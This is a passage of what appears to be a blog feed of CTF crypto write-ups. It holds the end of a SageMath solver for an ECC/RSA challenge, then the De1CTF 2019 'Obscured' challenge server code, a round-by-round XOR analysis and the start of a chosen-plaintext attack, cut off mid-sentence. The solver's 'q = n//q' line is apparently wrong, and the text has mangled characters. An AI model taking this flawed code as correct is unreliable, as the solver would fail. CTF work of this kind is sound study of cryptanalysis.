class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ECC params</span></span><br><span class="line">lines = <span class="built_in">open</span>(<span class="string">&quot;downloads/ecc-rsa.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">p = ZZ(lines[<span class="number">0</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">a = ZZ(lines[<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">b = ZZ(lines[<span class="number">2</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA params</span></span><br><span class="line">e = ZZ(lines[<span class="number">5</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">n = ZZ(lines[<span class="number">6</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">c = ZZ(lines[<span class="number">7</span>].split(<span class="string">&quot; &quot;</span>)[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Definitions</span></span><br><span class="line">P = GF(p)</span><br><span class="line">E = EllipticCurve(P, [a, b])</span><br><span class="line">G = E(Gx, Gy)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Equation</span></span><br><span class="line">F. &lt; x &gt; = PolynomialRing(P)</span><br><span class="line">f = x ^ <span class="number">5</span> + a*x ^ <span class="number">3</span> + b*x ^ <span class="number">2</span> - n ^ <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Finding Primes</span></span><br><span class="line">p = [<span class="built_in">int</span>(i[<span class="number">0</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> f.roots() <span class="keyword">if</span> <span class="built_in">int</span>(n) % <span class="built_in">int</span>(i[<span class="number">0</span>]) == <span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">q = n//q</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decryption</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;watevr&#123;&#x27;</span> + long_to_bytes(m) + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;watevr&#123;lol&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>bâ€™watevr{lol}â€™</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> crypto </tag>
            
            <tag> EllipticCurve </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Obscured - De1CTF 2019</title>
      <link href="/2019/08/05/Obscured-De1CTF-2019/"/>
      <url>/2019/08/05/Obscured-De1CTF-2019/</url>
      
        <content type="html"><![CDATA[<h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 45.32.100.6 8003ï¼ˆSingaporeï¼‰</span><br><span class="line"></span><br><span class="line">nc 39.108.37.223 8003 (China)</span><br></pre></td></tr></table></figure><h2 id="Attachment"><a href="#Attachment" class="headerlink" title="Attachment"></a>Attachment</h2><pre><code>- task.py</code></pre><h3 id="task-py"><a href="#task-py" class="headerlink" title="task.py"></a>task.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,random,sys,string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    pad_length = <span class="number">8</span>-<span class="built_in">len</span>(x)</span><br><span class="line">    <span class="keyword">return</span> pad_length*<span class="string">&#x27;0&#x27;</span>+x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2list</span>(<span class="params">x</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>,<span class="number">8</span>):</span><br><span class="line">        r = x[i:i+<span class="number">8</span>]</span><br><span class="line">        res.append(<span class="built_in">int</span>(r,<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list2hex</span>(<span class="params">x</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        res += pad(<span class="built_in">hex</span>(x[i])[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sbox is a secret permutation from F(2^32) to itself</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Sbox</span>(<span class="params">plain</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Obscured</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg</span>):</span><br><span class="line">    msg = hex2list(msg)</span><br><span class="line">    A , B , C , D = msg[<span class="number">0</span>],msg[<span class="number">1</span>],msg[<span class="number">2</span>],msg[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        S = Sbox(A^C)</span><br><span class="line">        A , B , C , D = A ^ B ^ S , A ^ B ^ D ^ S , A ^ C ^ D , C ^ D ^ S </span><br><span class="line">    <span class="keyword">return</span> list2hex([A,B,C,D])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>(SocketServer.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">self</span>):</span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof).hexdigest()</span><br><span class="line">        self.request.send(<span class="string">&quot;sha256(XXXX+%s) == %s\n&quot;</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">        self.request.send(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>)</span><br><span class="line">        x = x.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvhex</span>(<span class="params">self, sz</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = sz</span><br><span class="line">            res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">while</span> r&gt;<span class="number">0</span>:</span><br><span class="line">                res += self.request.recv(r)</span><br><span class="line">                <span class="keyword">if</span> res.endswith(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">                    r = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r = sz - <span class="built_in">len</span>(res)</span><br><span class="line">            res = res.strip()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> res.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dosend</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        signal.alarm(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        signal.alarm(<span class="number">450</span>)</span><br><span class="line">        secret = os.urandom(<span class="number">16</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        s = encrypt(secret)</span><br><span class="line">        self.dosend(<span class="string">&#x27;Welcome to the Crypto System.\n&#x27;</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;You can encrypt any plain you want and if you tell me the secret I will give you the flag.\n&#x27;</span>)    </span><br><span class="line">        self.dosend(<span class="string">&#x27;The enc_secret is: &#x27;</span>+s+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            self.dosend(<span class="string">&quot;Tell me the plaintext(hex): &quot;</span>)</span><br><span class="line">            pt = self.recvhex(<span class="number">33</span>)</span><br><span class="line">            <span class="keyword">if</span> pt==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(pt)!=<span class="number">32</span>:</span><br><span class="line">                self.dosend(<span class="string">&#x27;The length must be 32!!!\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ct = encrypt(pt)</span><br><span class="line">            self.dosend(<span class="string">&quot;The result is: %s\n&quot;</span> % ct)</span><br><span class="line">        self.dosend(<span class="string">&#x27;Tell me the secret and I will give you the flag.\n&#x27;</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;Secret(hex):\n&#x27;</span>)</span><br><span class="line">        sc = self.recvhex(<span class="number">33</span>)</span><br><span class="line">        <span class="keyword">if</span> sc==secret:</span><br><span class="line">            self.dosend(<span class="string">&#x27;Wow! How smart you are! Here is your flag:\n&#x27;</span>)</span><br><span class="line">            self.dosend(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.dosend(<span class="string">&#x27;Sorry you are wrong!\n&#x27;</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ForkedServer</span>(SocketServer.ForkingTCPServer, SocketServer.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8003</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><h2 id="Enryption-Block-Diagram"><a href="#Enryption-Block-Diagram" class="headerlink" title="Enryption Block Diagram"></a>Enryption Block Diagram</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">                                         one - Round </span><br><span class="line"></span><br><span class="line">                                       Message-Block</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">|          A          |          B          |          C          |          D          |</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">                |                |                   |   |                   |</span><br><span class="line">            A--&gt;|            B--&gt;|               C--&gt;|   |&lt;--C               |&lt;--D</span><br><span class="line">                |---------------/--------------------âŠ•   |                   |  </span><br><span class="line">                |              /                AâŠ•C-&gt;|   |------âŠ•------------|</span><br><span class="line">                |             /               -------------     |            |</span><br><span class="line">                |            /                |           |     |            |</span><br><span class="line">                |           |                 |   S-Box   |     |            |</span><br><span class="line">                |       B--&gt;|                 |           |     |&lt;-CâŠ•D       |</span><br><span class="line">                |        ---|                 -------------     |            |</span><br><span class="line">                |        |                         |            |            |</span><br><span class="line">                |        V                     S--&gt;|            |            |</span><br><span class="line">    ------------|-------&gt;âŠ•&lt;------------------------|            |            |</span><br><span class="line">    |                    |                         |            |            |</span><br><span class="line">    |                    |&lt;--AâŠ•BâŠ•S                 |            |            |</span><br><span class="line">    |       -------------|                         |            |            |</span><br><span class="line">    |       |                                      |&lt;--S        |            |</span><br><span class="line">    |       |---------------&gt;âŠ•&lt;--------------------|------------|------------|</span><br><span class="line">    |       |          ^     |   ^                 |            |      </span><br><span class="line">    |       |          |     |   |                 |-----------/-----------|</span><br><span class="line">    |       |       AâŠ•BâŠ•S    |   D                            /            |</span><br><span class="line">    |       |                |                        CâŠ•D--&gt; /             |&lt;--S</span><br><span class="line">    |       |                |&lt;--AâŠ•BâŠ•SâŠ•D                    /              |</span><br><span class="line">    |       |                |                   A         |---------------âŠ•</span><br><span class="line">A--&gt;|       |                |                   |         |               |</span><br><span class="line">    |       |                |                   V         V               |</span><br><span class="line">    |-------|----------------|----------------------------&gt;âŠ•               |</span><br><span class="line">            |                |                             |               |</span><br><span class="line">            |                |                             |               |</span><br><span class="line">            |                |                             |               |</span><br><span class="line">            |&lt;--AâŠ•BâŠ•S        |&lt;--AâŠ•BâŠ•SâŠ•D                   |&lt;--AâŠ•CâŠ•D       |&lt;--AâŠ•CâŠ•DâŠ•S</span><br><span class="line">            |                |                             |               |</span><br><span class="line">            |                |                             |               |</span><br><span class="line">            V                V                             V               V</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">|          A          |          B          |          C          |          D          |</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>This challenge is inspired from <a href="https://nsucrypto.nsu.ru/archive/2017/round/2/task/2/#data">NSUCRYPTO-2017 TwinPeaks</a>, but in a short view we can see that server uses a custom encryption algorithm (similar to TwinPeaks) to encrypt a 16 byte block of random bytes and our goal is to get the <code>secret</code> just by knowing the ciphertext, server also allows us to encrypt our own plaintext <code>20 times</code>, howerver we can solve the challenge just by using 6 queries.</p><h3 id="Encryption-Algorithm"><a href="#Encryption-Algorithm" class="headerlink" title="Encryption Algorithm"></a>Encryption Algorithm</h3><h4 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg</span>):</span><br><span class="line">    msg = hex2list(msg)</span><br><span class="line">    A , B , C , D = msg[<span class="number">0</span>],msg[<span class="number">1</span>],msg[<span class="number">2</span>],msg[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        S = Sbox(A^C)</span><br><span class="line">        A , B , C , D = A ^ B ^ S , A ^ B ^ D ^ S , A ^ C ^ D , C ^ D ^ S </span><br><span class="line">    <span class="keyword">return</span> list2hex([A,B,C,D])</span><br></pre></td></tr></table></figure><p>If we notice the encryption algorithm, most of the part of the algorithm is just <code>xoring</code> and an <code>Sbox</code> which is an unkown function, but how can we even think of decrypting an unknown encryption algorithm (either with or without the key), which turns out since the whole encryption process excluding Sbox is just Xoring it is more likely to get the repeatition of the same data and get cancelled out and this makes it feassable to make equations and get what we want.</p><p>letâ€™s observe whatâ€™s happening in each round</p><h4 id="Round-1"><a href="#Round-1" class="headerlink" title="Round 1"></a>Round 1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S0  =    Sbox(A0 ^ C0)</span><br><span class="line">A1  =    A0     ^    B0  ^   S0</span><br><span class="line">B1  =    A0     ^    B0  ^   D0  ^   S0</span><br><span class="line">C1  =    A0     ^    C0  ^   D0</span><br><span class="line">D1  =    C0     ^    D0  ^   S0</span><br></pre></td></tr></table></figure><h4 id="Round-2"><a href="#Round-2" class="headerlink" title="Round 2"></a>Round 2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S1  =    Sbox(A1 ^ C1)                      =   Sbox(B0 ^ C0 ^ D0 ^ S0)</span><br><span class="line">A2  =    A1     ^    B1  ^   S1             =   D0     ^    S1</span><br><span class="line">B2  =    A1     ^    B1  ^   D1  ^   S1     =   C0     ^    S0  ^   S1</span><br><span class="line">C2  =    A1     ^    C1  ^   D1             =   B0</span><br><span class="line">D2  =    C1     ^    D1  ^   S1             =   A0     ^    S0  ^   S1</span><br></pre></td></tr></table></figure><h4 id="Round-3"><a href="#Round-3" class="headerlink" title="Round 3"></a>Round 3</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S2  =    Sbox(A2 ^ C2)                      =   Sbox(B0 ^ D0 ^ S1)</span><br><span class="line">A3  =    A2     ^    B2  ^   S2             =   C0     ^    D0  ^   S0  ^   S2</span><br><span class="line">B3  =    A2     ^    B2  ^   D2  ^   S2     =   A0     ^    C0  ^   D0  ^   S1  ^   S2</span><br><span class="line">C3  =    A2     ^    C2  ^   D2             =   A0     ^    B0  ^   D0  ^   S0</span><br><span class="line">D3  =    C2     ^    D2  ^   S2             =   A0     ^    B0  ^   S0  ^   S1  ^   S2</span><br></pre></td></tr></table></figure><h4 id="Round-4"><a href="#Round-4" class="headerlink" title="Round 4"></a>Round 4</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S3  =    Sbox(A3 ^ C3)                      =   Sbox(A0 ^ B0 ^ C0 ^ S2)</span><br><span class="line">A4  =    A3     ^    B3  ^   S3             =   A0     ^    S0  ^   S1  ^   S3</span><br><span class="line">B4  =    A3     ^    B3  ^   D3  ^   S3     =   B0     ^    S2  ^   S3</span><br><span class="line">C4  =    A3     ^    C3  ^   D3             =   C0     ^    S0  ^   S1</span><br><span class="line">D4  =    C3     ^    D3  ^   S3             =   D0     ^    S1  ^   S2  ^   S3</span><br></pre></td></tr></table></figure><h4 id="Round-5"><a href="#Round-5" class="headerlink" title="Round 5"></a>Round 5</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S4  =    Sbox(A4 ^ C4)                      =   Sbox(A0 ^ C0 ^ S3)</span><br><span class="line">A5  =    A4     ^    B4  ^   S4             =   A0     ^    B0  ^   S0  ^   S1  ^   S2  ^   S4</span><br><span class="line">B5  =    A4     ^    B4  ^   D4  ^   S4     =   A0     ^    B0  ^   D0  ^   S0  ^   S3  ^   S4</span><br><span class="line">C5  =    A4     ^    C4  ^   D4             =   A0     ^    C0  ^   D0  ^   S1  ^   S2</span><br><span class="line">D5  =    C4     ^    D4  ^   S4             =   C0     ^    D0  ^   S0  ^   S2  ^   S3  ^   S4</span><br></pre></td></tr></table></figure><h4 id="Round-6"><a href="#Round-6" class="headerlink" title="Round 6"></a>Round 6</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">S5  =    Sbox(A5 ^ C5)                      =   Sbox(B0 ^ C0 ^ D0 ^ S0 ^ S4)</span><br><span class="line">A6  =    A5     ^    B5  ^   S5             =   D0     ^    S1  ^   S2  ^   S3  ^   S5</span><br><span class="line">B6  =    A5     ^    B5  ^   D5  ^   S5     =   C0     ^    S0  ^   S1  ^   S4  ^   S5</span><br><span class="line">C6  =    A5     ^    C5  ^   D5             =   B0     ^    S2  ^   S3</span><br><span class="line">D6  =    C5     ^    D5  ^   S5             =   A0     ^    S0  ^   S1  ^   S3  ^   S4  ^   S5</span><br></pre></td></tr></table></figure><h2 id="Exploit-Idea"><a href="#Exploit-Idea" class="headerlink" title="Exploit Idea"></a>Exploit Idea</h2><p>If we notice the equations of Round-6 we can say that <code>a6, b6, c6, d6</code> are equal to <code>a0, b0, c0, d0</code> with a lot of <code>S&#39;s</code> xored, since itâ€™s just the bunch of sâ€™s that are xored extra if we can able to cancel them out we can find <code>a0, b0, c0, d0</code>.</p><h3 id="Equations"><a href="#Equations" class="headerlink" title="Equations"></a>Equations</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A6  =   D0     ^    S1  ^   S2  ^   S3  ^   S5</span><br><span class="line">B6  =   C0     ^    S0  ^   S1  ^   S4  ^   S5</span><br><span class="line">C6  =   B0     ^    S2  ^   S3</span><br><span class="line">D6  =   A0     ^    S0  ^   S1  ^   S3  ^   S4  ^   S5</span><br></pre></td></tr></table></figure><p>Rearranging them gives us</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">D0  =   A6     ^    S1  ^   S2  ^   S3  ^   S5</span><br><span class="line">C0  =   B6     ^    S0  ^   S1  ^   S4  ^   S5</span><br><span class="line">B0  =   C6     ^    S2  ^   S3</span><br><span class="line">A0  =   D6     ^    S0  ^   S1  ^   S3  ^   S4  ^   S5</span><br></pre></td></tr></table></figure><p>so, to recover the plaintext we need to know the values of all <code>S&#39;s</code>. here in this case we can recover at most of 2 s values <code>S2</code> and <code>S3</code> If we know <code>A0 and C0</code> by rearranging the equations:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">B6 ^ D6 :</span><br><span class="line">            C0  ^   S0  ^   S1      ^       S4  ^   S5</span><br><span class="line"></span><br><span class="line">                             âŠ•</span><br><span class="line">            </span><br><span class="line">            A0  ^   S0  ^   S1  ^   S3  ^   S4  ^   S5</span><br><span class="line">        ------------------------------------------------</span><br><span class="line">                    A0  ^   C0  ^   S3</span><br><span class="line"></span><br><span class="line">S3  =   B6  ^   D6  ^   A0  ^   C0</span><br></pre></td></tr></table></figure><p>now with the value of <code>S3 and B0</code> we can recover s2 as well:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C6  =   B0  ^   S2  ^   S3  </span><br><span class="line">                        </span><br><span class="line">                            ==&gt; S2  =   C6  ^   B0  ^   S3</span><br></pre></td></tr></table></figure><p>since we should know the plaintext to recover <code>S2 and S3</code>, we cannot recover the <code>S-values</code> of the <code>secret</code>. this leads us to use the queries and try to get the <code>S</code> values we need. If we look at all the s-equations:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">S0  =   Sbox(   A0 ^ C0                     )</span><br><span class="line">S1  =   Sbox(   B0 ^ C0 ^ D0 ^ S0           )</span><br><span class="line">S2  =   Sbox(   B0 ^ D0 ^ S1                )</span><br><span class="line">S3  =   Sbox(   A0 ^ B0 ^ C0 ^ S2           )</span><br><span class="line">S4  =   Sbox(   A0 ^ C0 ^ S3                )</span><br><span class="line">S5  =   Sbox(   B0 ^ C0 ^ D0 ^ S0 ^ S4      )</span><br></pre></td></tr></table></figure><p>Since, we can recover <code>S2 and S3</code> if we could craft the plaintext such that we get the output of <code>Sbox</code> function, we can recover all the <code>S0-S5</code> values and be able to recover the <code>secret</code>. My idea is to craft the message such that <code>B0 ^ C0 ^ D0 ^ S0</code> will give the value we need so we get the value of <code>S2</code> which is <code>Sbox(value needed)</code> but we donâ€™t know the value of <code>S0</code>, so if we craft our msg having <code>A0 = m, B0 = m, C0 = m ^ x, D0 = Sbox(x)</code> value of <code>S0</code> will be <code>Sbox(x)</code> since <code>S0 = Sbox( A0 ^ C0 ) = Sbox(  m ^ m ^ x   ) = Sbox(x)</code> and in the equation of <code>S1</code> -&gt; <code>B0 ^ C0 ^ D0 ^ S0 = m ^ m ^ x ^ Sbox(x) ^ Sbox(x) = x</code> so <code>S1 = 